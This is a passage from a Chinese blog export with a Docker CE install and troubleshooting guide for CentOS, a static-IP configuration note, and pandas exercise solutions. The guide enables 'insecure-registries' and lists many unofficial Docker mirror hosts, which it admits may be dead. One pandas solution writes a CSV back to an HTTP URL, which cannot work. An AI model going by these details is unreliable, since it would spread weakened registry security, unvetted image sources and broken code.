class="line"></span><br><span class="line"><span class="comment"># 替换，将“male”的值替换为“M”，将“female”的值替换为“F”。</span></span><br><span class="line">data[<span class="string">&#x27;Name&#x27;</span>].replace(&#123;<span class="string">&quot;male&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;female&quot;</span>: <span class="string">&quot;F&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>安装并使用 docker-ce</title>
    <url>/posts/be729bfc/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="下载">下载</h3>
<p>从阿里云下载 docker-ce 仓库，并将仓库文件移动到 /etc/yum.repos.d/ 目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> curl -O https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> docker-ce.repo /etc/yum.repos.d/</span><br></pre></td></tr></table></figure>
<p>刷新yum缓存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum clean all</span><br><span class="line"><span class="built_in">sudo</span> yum makecache fast</span><br></pre></td></tr></table></figure>
<p>查看 docker-ce 源是否添加成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list docker-ce</span><br></pre></td></tr></table></figure>
<h3 id="安装">安装</h3>
<p>安装 docker-ce</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install docker-ce -y</span><br></pre></td></tr></table></figure>
<p>执行命令查看是否安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure>
<p>如果出现这种错误，说明没有运行</p>
<p><img src="1.png" alt=""></p>
<h3 id="docker-的启动与停止">docker 的启动与停止</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动 docker</span></span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 守护进程重启</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 docker 服务(二选其一即可)</span></span><br><span class="line">systemctl restart docker</span><br><span class="line">service docker restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭 docker (二选其一即可)</span></span><br><span class="line">systemctl stop docker</span><br><span class="line">service docker stop</span><br></pre></td></tr></table></figure>
<h3 id="常用docker命令">常用docker命令</h3>
<h4 id="查看镜像">查看镜像</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images </span><br></pre></td></tr></table></figure>
<h4 id="搜索镜像">搜索镜像</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search 镜像名称</span><br></pre></td></tr></table></figure>
<h4 id="拉取镜像">拉取镜像</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名称</span><br></pre></td></tr></table></figure>
<h4 id="按镜像id删除镜像">按镜像id删除镜像</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
<h4 id="删除所有镜像">删除所有镜像</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>
<h4 id="查看正在运行的容器">查看正在运行的容器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<h4 id="查看所有容器">查看所有容器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a </span><br></pre></td></tr></table></figure>
<h4 id="查看最后一次运行的容器">查看最后一次运行的容器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -l</span><br></pre></td></tr></table></figure>
<h4 id="查看停止的容器">查看停止的容器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -f status=exited</span><br></pre></td></tr></table></figure>
<h4 id="创建容器">创建容器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run</span><br><span class="line"></span><br><span class="line">    -i：表示运行容器</span><br><span class="line"></span><br><span class="line">    -t：表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。交互式</span><br><span class="line"></span><br><span class="line">    --name :为创建的容器命名。</span><br><span class="line"></span><br><span class="line">    -v：表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上。</span><br><span class="line"></span><br><span class="line">    -d：在run后面加上-d参数,则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，创建后就会自动进去容器）。</span><br><span class="line"></span><br><span class="line">    -p：表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射</span><br></pre></td></tr></table></figure>
<h4 id="创建并进入容器，退出停止-交互式">创建并进入容器，退出停止(交互式)</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --name=容器名称 镜像名称:标签 /bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="退出当前容器">退出当前容器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<h4 id="守护式创建容器">守护式创建容器</h4>
<p>创建但不登陆</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=容器名称 镜像名称:标签</span><br></pre></td></tr></table></figure>
<p>创建并登陆</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器名称(或者容器<span class="built_in">id</span>) /bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="停止与启动容器">停止与启动容器</h4>
<p>停止容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop 容器名称(或者容器<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure>
<p>启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器名称(或者容器<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure>
<h4 id="文件拷贝">文件拷贝</h4>
<p>将文件拷贝到容器内</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 需要拷贝的文件或目录 容器名称:容器目录</span><br></pre></td></tr></table></figure>
<p>将文件从容器内拷贝出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 容器名称:容器目录 需要拷贝的文件或目录</span><br></pre></td></tr></table></figure>
<h4 id="目录挂载">目录挂载</h4>
<p>在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样就可以通过修改宿主机某个目录的文件从而去影响容器。创建容器添加-v参数 后边为 宿主机目录:容器目录，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di -v /usr/local/myhtml:/usr/local/myhtml --name=mycentos centos:7</span><br></pre></td></tr></table></figure>
<h4 id="迁移与备份">迁移与备份</h4>
<p>将容器保存为镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit 容器名称 镜像名称</span><br></pre></td></tr></table></figure>
<p>将镜像保存为 tar 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save -o image.tar 镜像名称</span><br></pre></td></tr></table></figure>
<p>恢复镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 恢复之前先删除原有的镜像</span></span><br><span class="line">docker load -i image.tar</span><br></pre></td></tr></table></figure>
<h4 id="私有仓库搭建与配置">私有仓库搭建与配置</h4>
<p>拉取私有仓库镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull registry</span><br></pre></td></tr></table></figure>
<p>启动私有仓库容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=registry -p 5000:5000 registry</span><br></pre></td></tr></table></figure>
<p>打开浏览器，访问 <code>http://宿主机ip:5000/v2/_catalog</code>，返回{“repositories”:[]}表明私有仓库搭建成功，并且内容为空</p>
<p>修改daemon.json</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
<p>添加或修改以下内容，而后保存退出，此步用于让 docker 信任私有仓库地址</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;insecure-registries&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;宿主机ip:5000&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure>
<p>重启docker服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<h4 id="镜像上传至私有仓库">镜像上传至私有仓库</h4>
<p>标记此镜像为私有仓库的镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag redis 宿主机ip:5000/redis</span><br></pre></td></tr></table></figure>
<p>再次启动私有仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start registry</span><br></pre></td></tr></table></figure>
<p>上传标记的镜像到私有仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push 宿主机ip:5000/redis</span><br></pre></td></tr></table></figure>
<h3 id="可能会出现的错误或警告">可能会出现的错误或警告</h3>
<h4 id="Warning-Stopping-docker-service-but-it-can-still-be-activated-by-docker-socket">Warning: Stopping docker.service, but it can still be activated by: docker.socket</h4>
<p>一般出现在停止docker运行的时候，原因是 Docker 在关闭状态下被访问自动唤醒机制，意味如果试图连接到 docker socket，而 docker 服务没有运行，系统将自动启动docker。</p>
<h5 id="解决办法">解决办法</h5>
<h6 id="方法1、-推荐">方法1、(推荐)</h6>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop docker.socket</span><br></pre></td></tr></table></figure>
<h6 id="方法2、">方法2、</h6>
<p>删除docker.socket</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /lib/systemd/system/docker.socket</span><br></pre></td></tr></table></figure>
<h4 id="Error-response-from-daemon-Get-https-registry-1-docker-io-v2-net-http-request-canceled-while-waiting-for-connection-Client-Timeout-exceeded-while-awaiting-headers">Error response from daemon: Get <code>&quot;https://registry-1.docker.io/v2/&quot;</code>: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)</h4>
<p>这种错误是因为国内把docker的官方源墙了，所以访问不了。</p>
<p>开始换源</p>
<p>而后进入/etc/docker修改daemon.json，如果没有这个json文件就新建一个<br>
如果是用snap安装的docker，则进入/var/snap/docker/current/config/目录修改daemon.json</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/docker</span><br><span class="line"><span class="comment"># 查看有没有daemon.json文件</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 如果没有就新建</span></span><br><span class="line"><span class="built_in">touch</span> daemon.json</span><br></pre></td></tr></table></figure>
<p>编辑daemon.json</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi daemon.json</span><br></pre></td></tr></table></figure>
<p>添加以下配置</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;https://docker.1panel.live&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://hub.rat.dev&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.registry.cyou&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker-cf.registry.cyou&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://dockercf.jsdelivr.fyi&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.jsdelivr.fyi&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://dockertest.jsdelivr.fyi&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.nju.edu.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.sjtug.sjtu.edu.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://mirror.iscas.ac.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.rainbond.cc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://dockerhub.icu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://hub.uuuadc.top&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.anyhub.us.kg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.awsl9527.cn&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>然后重启docker即可，上面的那些源有可能某些失效了，视情况决定是否删除。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker restart</span><br><span class="line"><span class="comment"># 如果用的是snap安装的docker</span></span><br><span class="line">snap restart docker</span><br></pre></td></tr></table></figure>
<h4 id="Job-for-docker-service-failed-because-start-of-the-service-was-attempted-too-often-See-“systemctl-status-docker-service”-and-“journalctl-xe”-for-details-To-force-a-start-use-“systemctl-reset-failed-docker-service”-followed-by-“systemctl-start-docker-service”-again">Job for docker.service failed because start of the service was attempted too often. See “systemctl status docker.service” and “journalctl -xe” for details. To force a start use “systemctl reset-failed docker.service” followed by “systemctl start docker.service” again.</h4>
<p>这个错误有可能是daemon.json文件里面可能有语法错误导致启动不了，检查这个文件哪里写错了。</p>
<h4 id="Cannot-connect-to-the-Docker-daemon-at-unix-var-run-docker-sock-Is-the-docker-daemon-running">Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</h4>
<p>这个错误是没有启动docker，启动一下就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">service docker restart</span><br><span class="line"><span class="comment"># 如果用的是snap安装的docker</span></span><br><span class="line">snap restart docker</span><br></pre></td></tr></table></figure>
<h4 id="Warning-docker-service-changed-on-disk-Run-‘systemctl-daemon-reload’-to-reload-units">Warning: docker.service changed on disk. Run ‘systemctl daemon-reload’ to reload units.</h4>
<p>根据提示执行命令即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安装</category>
        <category>使用</category>
        <category>配置</category>
      </categories>
      <tags>
        <tag>Centos7</tag>
        <tag>Linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS 7 配置 IP 地址</title>
    <url>/posts/57182686/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h4 id="切换至特权模式，并输入密码">切换至特权模式，并输入密码</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>
<h4 id="查看网卡信息">查看网卡信息</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
<h4 id="修改网卡配置文件">修改网卡配置文件</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33     //进入网卡ens33的配置页面</span><br><span class="line">i        //输i进入文件编辑模式(i=insert)</span><br><span class="line">BOOTPROTO=<span class="string">&quot;dhcp&quot;</span>       //修改：将dhcp修改为static，修改后为BOOTPROTO=static</span><br><span class="line">ONBOOT=<span class="built_in">yes</span>               //修改为<span class="built_in">yes</span>, 网卡开机自启动</span><br><span class="line">Esc或Ctrl+c   //退出文件编辑模式</span><br><span class="line">:wq           //保存文件修改并退出</span><br><span class="line">service network restart     //重启网卡</span><br><span class="line">ip add  //查看网卡ens33的IP地址已经变成配置的静态IP地址</span><br><span class="line">ping xxx.xxx.xxx.xxx      //ping自己，ping网关，验证网络能通</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CentOS</tag>
        <tag>IP</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas 例题 - 1</title>
    <url>/posts/ef59dde3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="电商订单数据清洗">电商订单数据清洗</h3>
<h4 id="任务详情">任务详情</h4>
<p>请根据系统提供的订单数据表，按要求完成以下任务：<br>
统计订单表格中，商品描述(choice_description)中为“NaN”的数量，并将其批量替换为“banana”，<br>
请根据以上要求，将函数 nanCount() 补充完整，函数的返回值为整数值，既为“NaN”的数量。</p>
<h4 id="任务要求">任务要求</h4>
<ol>
<li>订单数据表为以逗号为分隔符的csv文件，编码方式为 UTF-8；</li>
<li>注意：DataFrame 由后台生成，作为参数 order_data 传递到 nonCount() 中，不需要生成新的 DataFrame；</li>
<li>DataFrame 读取为订单数据表；</li>
<li>返回值为 NaN 的数量，int 数据类型。<br>
<a href="http://72.itmc.org.cn:80/JS001/data/user/15960/63/fj_order_data.csv">订单数据表.csv</a></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nanCount</span>(<span class="params">self</span>)-&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># 读取csv文件</span></span><br><span class="line">        order_data = pd.read_csv(<span class="string">&#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/63/fj_order_data.csv&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># choice_description 为空的记录求和 </span></span><br><span class="line">        nan_count = order_data[<span class="string">&#x27;choice_description&#x27;</span>].isna().<span class="built_in">sum</span>()</span><br><span class="line">        <span class="comment"># 将 choice_description 为空的记录填充为 banana</span></span><br><span class="line">        order_data[<span class="string">&#x27;choice_description&#x27;</span>].fillna(<span class="string">&#x27;banana&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># 将修改写入文件</span></span><br><span class="line">        order_data.to_csv(<span class="string">&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/63/fj_order_data.csv&quot;</span>, index=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># 返回 choice_description 列为空的记录数</span></span><br><span class="line">        <span class="keyword">return</span> nan_count</span><br></pre></td></tr></table></figure>
<h3 id="电商订单数据计算">电商订单数据计算</h3>
<h4 id="任务详情-2">任务详情</h4>
<p>请根据系统提供的订单数据表，按要求完成以下三个任务：<br>
传入一个字符串，返回订单总金额 (quantity * item_price) 最大或最小的商品，并返回商品的名称(item_name)。<br>
请根据以上要求，将函数 salesStr() 补充完整，函数的返回值为字符(str)，比如：“Steak Burrito”<br>
订单数据访问地址请见下方：</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>中文含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>order_id</td>
<td>商品编号</td>
</tr>
<tr>
<td>quantity</td>
<td>数量</td>
</tr>
<tr>
<td>item_name</td>
<td>商品名称</td>
</tr>
<tr>
<td>choice_description</td>
<td>描述</td>
</tr>
<tr>
<td>item_price</td>
<td>单价</td>
</tr>
</tbody>
</table>
<h4 id="任务要求-2">任务要求</h4>
<ol>
<li>传入一个字符串(‘max’ 或 ‘min’)，返回订单总金额最大或最小的商品的名称(item_name) ；</li>
<li>传入的字符串不区分大小写，即传入值可能是&quot;Max&quot;，也可能是&quot;max&quot;；</li>
<li>传入&quot;max&quot;，返回订单总金额 (quantity * item_price) 最大的商品名称；传入“min”，返回订单总金额 (quantity * item_price) 最小的商品名称；</li>
<li>返回字符串区分大小写，且保留字符串中间空格。<br>
<a href="http://72.itmc.org.cn:80/JS001/data/user/15960/80/fj_order_data.csv">订单数据表.csv</a></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">salesStr</span>(<span class="params">self, condition: <span class="built_in">str</span></span>)-&gt; <span class="built_in">str</span>:</span><br><span class="line">        condition = condition.lower()</span><br><span class="line">        url = <span class="string">&#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/80/fj_order_data.csv&#x27;</span></span><br><span class="line">        chipo = pd.read_csv(url, sep=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        chipo[<span class="string">&quot;item_price&quot;</span>] = chipo[<span class="string">&quot;item_price&quot;</span>].<span class="built_in">str</span>.replace(<span class="string">&quot;$&quot;</span>, <span class="string">&#x27;&#x27;</span>, regex=<span class="literal">False</span>).astype(<span class="built_in">float</span>)</span><br><span class="line">        chipo[<span class="string">&quot;total_price&quot;</span>] = chipo[<span class="string">&quot;quantity&quot;</span>] * chipo[<span class="string">&quot;item_price&quot;</span>]</span><br><span class="line">        chipo_sum = chipo.groupby(<span class="string">&quot;item_name&quot;</span>)[[<span class="string">&#x27;quantity&#x27;</span>, <span class="string">&quot;item_price&quot;</span>]].<span class="built_in">sum</span>().reset_index()</span><br><span class="line">        chipo_sum[<span class="string">&quot;total_price&quot;</span>] = chipo_sum[<span class="string">&quot;quantity&quot;</span>] * chipo_sum[<span class="string">&quot;item_price&quot;</span>]</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> condition == <span class="string">&quot;max&quot;</span>:</span><br><span class="line">            result = chipo_sum[chipo_sum[<span class="string">&quot;total_price&quot;</span>] == chipo_sum[<span class="string">&quot;total_price&quot;</span>].<span class="built_in">max</span>()][<span class="string">&quot;item_name&quot;</span>].tolist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> condition == <span class="string">&quot;min&quot;</span>:</span><br><span class="line">            result = chipo_sum[chipo_sum[<span class="string">&quot;total_price&quot;</span>] == chipo_sum[<span class="string">&quot;total_price&quot;</span>].<span class="built_in">min</span>()][<span class="string">&quot;item_name&quot;</span>].tolist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h3 id="DataFrame计算平均值">DataFrame计算平均值</h3>
<h4 id="任务详情-3">任务详情</h4>
<p>给定一个DataFrame对象 df，要求返回各行的平均值。<br>
具体操作如下：<br>
1.添加新列 ‘avg’ 用于计算各行的平均值；<br>
2.使用数组返回新列 ‘avg’。</p>
<h4 id="任务要求-3">任务要求</h4>
<p>1.程序接收 DataFrame 对象 df，返回结果是 list 数据类型；<br>
2.注意：平均值需要四舍五入保留两位小数。</p>
<h4 id="测试用例">测试用例</h4>
<p>输入：</p>
<table>
<thead>
<tr>
<th></th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>24</td>
<td>27</td>
<td>7</td>
<td>23</td>
<td>25</td>
<td>7</td>
<td>21</td>
</tr>
<tr>
<td>1</td>
<td>16</td>
<td>30</td>
<td>8</td>
<td>4</td>
<td>26</td>
<td>30</td>
<td>8</td>
</tr>
<tr>
<td>2</td>
<td>18</td>
<td>28</td>
<td>7</td>
<td>17</td>
<td>17</td>
<td>16</td>
<td>25</td>
</tr>
</tbody>
</table>
<p>输出：<br>
[19.14, 17.43, 18.29]<br>
解释：首先生成新列’avg’，需要注意平均数需要四舍五入保留小数点后两位</p>
<table>
<thead>
<tr>
<th></th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>avg</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>24</td>
<td>27</td>
<td>7</td>
<td>23</td>
<td>25</td>
<td>7</td>
<td>21</td>
<td>19.14</td>
</tr>
<tr>
<td>1</td>
<td>16</td>
<td>30</td>
<td>8</td>
<td>4</td>
<td>26</td>
<td>30</td>
<td>8</td>
<td>17.43</td>
</tr>
<tr>
<td>2</td>
<td>18</td>
<td>28</td>
<td>7</td>
<td>17</td>
<td>17</td>
<td>16</td>
<td>25</td>
<td>18.29</td>
</tr>
</tbody>
</table>
<p>输入：</p>
<table>
<thead>
<tr>
<th></th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>10</td>
<td>19</td>
<td>4</td>
<td>7</td>
</tr>
<tr>
<td>1</td>
<td>9</td>
<td>5</td>
<td>28</td>
<td>14</td>
</tr>
<tr>
<td>2</td>
<td>30</td>
<td>27</td>
<td>1</td>
<td>13</td>
</tr>
<tr>
<td>3</td>
<td>21</td>
<td>14</td>
<td>19</td>
<td>9</td>
</tr>
<tr>
<td>4</td>
<td>1</td>
<td>25</td>
<td>30</td>
<td>16</td>
</tr>
</tbody>
</table>
<p>输出：[10.0, 14.0, 17.75, 15.75, 18.0]<br>
解释：首先生成新列’avg’，其次返回’avg’列</p>
<table>
<thead>
<tr>
<th></th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>avg</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>10</td>
<td>19</td>
<td>4</td>
<td>7</td>
<td>10.00</td>
</tr>
<tr>
<td>1</td>
<td>9</td>
<td>5</td>
<td>28</td>
<td>14</td>
<td>14.00</td>
</tr>
<tr>
<td>2</td>
<td>30</td>
<td>27</td>
<td>1</td>
<td>13</td>
<td>17.75</td>
</tr>
<tr>
<td>3</td>
<td>21</td>
<td>14</td>
<td>19</td>
<td>9</td>
<td>15.75</td>
</tr>
<tr>
<td>4</td>
<td>1</td>
<td>25</td>
<td>30</td>
<td>16</td>
<td>18.00</td>
</tr>
</tbody>
</table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">CalAvg</span>(<span class="params">self, df: <span class="string">&#x27;pd.DataFrame&#x27;</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        df[<span class="string">&#x27;avg&#x27;</span>] = <span class="built_in">round</span>(df.mean(axis=<span class="number">1</span>), <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(df[<span class="string">&#x27;avg&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h3 id="乐高商店收入计算">乐高商店收入计算</h3>
<h4 id="题目描述">题目描述</h4>
<p>我们需要完成乐高商店的分析，请你根据指引完成以下任务：<br>
1.使用 Pandas 读取数据；<br>
2.去掉没有价格的数据，将销量为空的数据填充为0；<br>
3.计算所有产品总收入；<br>
4.计算该数据中产品价格的平均值;<br>
5.程序后台传入产品标题title，要求计算该产品的收入（收入总计）；<br>
6.将总收入、平均价格、产品收入保存到列表里，返回给后台。</p>
<h4 id="题目要求">题目要求</h4>
<p>1.程序传入标题title数据类型是str；<br>
2.程序传出数据类型是列表类型，列表中所有元素的数据类型均是 float；<br>
3.如果产品标题title存在多个，则计算相同title商品的总收入；<br>
4.平均价格需要四舍五入保留小数点后2位。</p>
<h4 id="测试用例-2">测试用例</h4>
<p>输入：’乐高旗舰店官网大电影系列70837Shimmer&amp;Shine闪亮水疗馆玩具积木’<br>
输出；[xxx, xxx, 1598.0]<br>
解释：总收入和平均价格隐藏，当前产品收入总计是1598.0</p>
<p>输入：’乐高旗舰店幻影忍者系列70668雷电忍者杰的暴风战机’<br>
输出：[xxx, xxx, 259073.0]<br>
解释：总收入和平均价格隐藏，当前产品收入总计是259073.0</p>
<p>输入：’乐高旗舰店官网创意百变高手系列10261大型过山车积木成人送礼’<br>
输出：[xxx, xxx, 41986.0]</p>
<h4 id="数据说明">数据说明</h4>
<p>文本数据是excel文件，字段含义如下：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>title</td>
<td>商品名</td>
<td>乐高旗舰店官网 LEGO积木 儿童玩具男孩 积木拼装玩具益智</td>
</tr>
<tr>
<td>age_range</td>
<td>商品对应的年龄等级</td>
<td>适用年纪6+岁</td>
</tr>
<tr>
<td>price</td>
<td>商品价格</td>
<td>899.0</td>
</tr>
<tr>
<td>sales_num</td>
<td>售卖数量</td>
<td>217.0</td>
</tr>
</tbody>
</table>
